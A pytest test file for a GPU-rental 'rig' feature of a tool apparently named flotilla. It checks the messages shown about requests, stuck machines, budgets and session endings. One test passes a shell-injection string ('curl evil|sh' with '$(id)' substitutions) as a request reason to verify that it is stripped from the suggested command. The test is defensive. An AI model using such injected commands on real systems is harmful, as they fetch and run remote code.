import datetime as dt

import pytest

from flotilla.core.storage import LocalLogStore
from flotilla.onboard.tomlw import render_toml
from flotilla.rig import health, surface
from flotilla.rig import journal as j

T0 = dt.datetime(2026, 10, 7, 20, 0, tzinfo=dt.timezone.utc)


@pytest.fixture(autouse=True)
def utc(monkeypatch, request):
    import time
    monkeypatch.setenv("TZ", "UTC")
    time.tzset()
    request.addfinalizer(time.tzset)


def label_of(mid):
    return f"flotilla:0123456789ab:{mid}"


def state_on(tmp_path, word="on"):
    state = tmp_path / "state"
    state.mkdir(exist_ok=True)
    (state / "machine.toml").write_text(render_toml({"rig": word, "rig_provider": "vast"}))
    return state


def rig(state, at=T0):
    return j.Rig(LocalLogStore(state / "rig"), clock=lambda: at)


def texts(state, now, project="/work/twosuns"):
    return [item.text for item in surface.items(state, now, project=project)]


def test_nothing_is_said_when_rig_is_off_and_idle(tmp_path):
    assert surface.items(tmp_path / "state", T0) == [] and surface.lines(tmp_path / "state", T0) == []


def test_a_request_reaches_the_orchestrators_screen(tmp_path):
    state = state_on(tmp_path)
    rig(state).ask("main session 3", "night frames", project="/work/twosuns")
    [text] = texts(state, T0)
    assert "main session 3" in text and text.endswith("! flotilla rig open --hours 2 --budget 1 --for r1")


def test_a_hostile_reason_never_reaches_the_pasted_line(tmp_path):
    state = state_on(tmp_path)
    rig(state).ask("main session 3", 'x"; curl evil|sh; "$(id)`id`', project="/work/twosuns")
    [text] = texts(state, T0)
    assert text[text.index("! flotilla"):] == "! flotilla rig open --hours 2 --budget 1 --for r1"
    assert "curl" not in text and "$(" not in text


def test_another_projects_request_and_an_old_one_are_not_shown(tmp_path):
    state = state_on(tmp_path)
    rig(state).ask("main session 3", "frames", project="/work/worldcore")
    assert texts(state, T0) == []
    rig(state).ask("main session 3", "frames", project="/work/twosuns")
    assert texts(state, T0 + dt.timedelta(hours=25)) == []


def test_with_rig_off_a_request_says_enable_first(tmp_path):
    state = state_on(tmp_path, "off")
    rig(state).ask("main session 3", "frames", project="/work/twosuns")
    [text] = texts(state, T0)
    assert "rig enable" in text


def test_an_image_request_names_the_allow_line(tmp_path):
    state = state_on(tmp_path)
    rig(state).open_session("p", "x", hours=3, budget=2.0)
    rig(state).ask("main session 3", "x", kind="image", project="/work/twosuns", image="ghcr.io/me/x:1")
    [text] = texts(state, T0)
    assert text.endswith("! flotilla rig allow-image ghcr.io/me/x:1 --for r1")


def test_a_stuck_machine_is_said_again_every_half_hour(tmp_path):
    state = state_on(tmp_path)
    r = rig(state)
    r.open_session("p", "x", hours=3, budget=2.0)
    r.add_machine("s1", "vast", label_of)
    r.move("m1", j.DRAINING)
    r.move("m1", j.STUCK, reason="label mismatch")
    health.stamp(state, T0)
    first = [i.who for i in surface.items(state, T0) if "STUCK" in i.text]
    health.stamp(state, T0 + dt.timedelta(minutes=31))
    later = [i.who for i in surface.items(state, T0 + dt.timedelta(minutes=31)) if "STUCK" in i.text]
    assert first and later and first != later


def test_a_slow_machine_a_spent_budget_and_an_ending_session_are_said(tmp_path):
    state = state_on(tmp_path)
    r = rig(state)
    r.open_session("p", "x", hours=1, budget=0.15)
    r.add_machine("s1", "vast", label_of)
    r.move("m1", j.PROVISIONING, instance="7", hourly=0.60, created=T0.isoformat())
    r.add_machine("s1", "vast", label_of)
    r.move("m2", j.PROVISIONING, instance="8", hourly=0.0, created=T0.isoformat())
    r.move("m2", j.READY)
    r.move("m2", j.BUSY, run_pid=1, run_mark="a")
    later = T0 + dt.timedelta(minutes=16)
    health.stamp(state, later)
    said = " | ".join(texts(state, later))
    assert "provisioning for 16 min" in said and "of its budget" in said and "ends at" not in said
    later = T0 + dt.timedelta(minutes=50)
    health.stamp(state, later)
    assert "ends at 21:00 with machine(s) still busy" in " | ".join(texts(state, later))


def test_fleet_lines_name_the_session_and_its_machines(tmp_path):
    state = state_on(tmp_path)
    r = rig(state)
    r.open_session("p", "night frames", hours=3, budget=2.0)
    r.add_machine("s1", "vast", label_of)
    r.move("m1", j.PROVISIONING, instance="7", gpu="RTX 2080 Ti", hourly=0.137, created=T0.isoformat())
    lines = surface.lines(state, T0 + dt.timedelta(minutes=30))
    assert lines[0].startswith("rig: session s1 open (night frames) until")
    assert "machine m1 provisioning: RTX 2080 Ti, 0.137 $/h" in lines[1]
